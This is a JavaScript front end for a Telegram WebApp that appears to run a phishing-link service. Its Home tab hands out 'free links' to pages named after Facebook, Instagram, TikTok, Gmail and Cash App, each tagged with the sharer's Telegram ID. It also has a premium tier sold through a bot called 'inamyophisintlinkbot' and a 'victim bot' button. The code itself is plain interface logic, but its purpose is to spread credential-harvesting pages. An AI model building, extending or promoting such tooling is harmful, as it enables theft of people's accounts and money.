// Telegram WebApp SDK init
const tg = window.Telegram?.WebApp;

if (!tg) {
  alert('⚠️ Please open this page inside the official Telegram app for full functionality.');
}

tg?.ready();

// Store user info or fallback defaults
const user = {
  id: tg?.initDataUnsafe?.user?.id || null,
  username: tg?.initDataUnsafe?.user?.username || 'Unknown',
  first_name: tg?.initDataUnsafe?.user?.first_name || 'User',
};

console.log('Telegram user info:', user);

// Elements
const sections = {
  home: document.getElementById('home'),
  premium: document.getElementById('premium'),
  victim: document.getElementById('victim'),
  donate: document.getElementById('donate'),
};
const navButtons = {
  home: document.getElementById('nav-home'),
  premium: document.getElementById('nav-premium'),
  victim: document.getElementById('nav-victim'),
  donate: document.getElementById('nav-donate'),
};

// Helper to switch active section
function showSection(name) {
  for (const sec in sections) {
    sections[sec].classList.toggle('active', sec === name);
  }
  for (const btn in navButtons) {
    const isActive = btn === name;
    navButtons[btn].classList.toggle('active', isActive);
    navButtons[btn].setAttribute('aria-selected', isActive ? 'true' : 'false');
  }
}

// Navigation click handlers
for (const btnName in navButtons) {
  navButtons[btnName].addEventListener('click', () => {
    showSection(btnName);
  });
}

// Copy link helper
function copyToClipboard(text) {
  navigator.clipboard.writeText(text).then(() => {
    alert('Link copied to clipboard!');
  }).catch(() => {
    alert('Failed to copy link.');
  });
}

// Build link card HTML
function buildLinkCard(name, imgUrl, linkUrl, isCopyAllowed = true, copyBtnText = 'Copy Link') {
  const card = document.createElement('div');
  card.className = 'link-card';

  const img = document.createElement('img');
  img.src = imgUrl;
  img.alt = `${name} image`;
  card.appendChild(img);

  const info = document.createElement('div');
  info.className = 'link-info';

  const linkName = document.createElement('div');
  linkName.className = 'link-name';
  linkName.textContent = name;
  info.appendChild(linkName);

  const linkUrlEl = document.createElement('div');
  linkUrlEl.className = 'link-url';
  linkUrlEl.textContent = linkUrl;
  info.appendChild(linkUrlEl);

  card.appendChild(info);

  if (isCopyAllowed) {
    const btn = document.createElement('button');
    btn.className = 'copy-btn';
    btn.textContent = copyBtnText;
    btn.addEventListener('click', () => copyToClipboard(linkUrl));
    card.appendChild(btn);
  }

  return card;
}

// === Home Section Links ===
const homeLinks = [
  {name: 'Link1', img: 'https://i.imgur.com/uUqv8Yx.png', url: 'https://rrloaty.github.io/a/face.html?id={telegram-id}'},
  {name: 'Link2', img: 'https://i.imgur.com/hB8X1vP.png', url: 'https://rrloaty.github.io/a/inst.html?id={telegram-id}'},
  {name: 'Link3', img: 'https://i.imgur.com/QXJ8MZ7.png', url: 'https://rrloaty.github.io/a/tiktok.html?id={telegram-id}'},
  {name: 'Link4', img: 'https://i.imgur.com/0JkkVu0.png', url: 'https://rrloaty.github.io/a/gma.html?id={telegram-id}'},
  {name: 'Link5', img: 'https://i.imgur.com/QXJ8MZ7.png', url: 'https://rrloaty.github.io/a/tiktok.html?id={telegram-id}'},
  {name: 'Link6', img: 'https://i.imgur.com/WHNz4cZ.png', url: 'https://rrloaty.github.io/a/cash.html?id={telegram-id}'},
];

// Render Home Links
function renderHome() {
  sections.home.innerHTML = '<h2>Free Links</h2>';
  homeLinks.forEach(link => {
    const url = link.url.replace('{telegram-id}', user.id ?? 'guest');
    const card = buildLinkCard(link.name, link.img, url);
    sections.home.appendChild(card);
  });

  sections.home.appendChild(document.createComment('Add more free links in the homeLinks array in main.js'));
}

// === Premium Section ===
const premiumLinks = [
  {name: 'Premium 1', img: 'https://i.imgur.com/RWnzxHD.png', url: 'https://bbott52.github.io/Mobixhub/?promo={telegram-id}'},
];

// Render Premium Section
function renderPremium() {
  sections.premium.innerHTML = `<h2>Premium Links</h2>`;

  if (user.id && premiumUserIds.includes(user.id)) {
    premiumLinks.forEach(link => {
      const url = link.url.replace('{telegram-id}', user.id);
      const card = buildLinkCard(link.name, link.img, url);
      sections.premium.appendChild(card);
    });
  } else {
    const msg = document.createElement('p');
    msg.textContent = 'Go premium to view or copy these links. You can message ';
    const botLink = document.createElement('a');
    botLink.href = 'https://t.me/inamyophisintlinkbot';
    botLink.target = '_blank';
    botLink.rel = 'noopener noreferrer';
    botLink.textContent = '@inamyophisintlinkbot';
    msg.appendChild(botLink);
    msg.append(' to go premium.');

    sections.premium.appendChild(msg);
  }
}

// Victim bot button
document.getElementById('open-victim-bot').addEventListener('click', () => {
  const url = 'https://t.me/intelligentverificationlinkbot?start=start';
  window.open(url, '_blank');
});

// On load
function init() {
  renderHome();
  renderPremium();
  showSection('home');
}
init();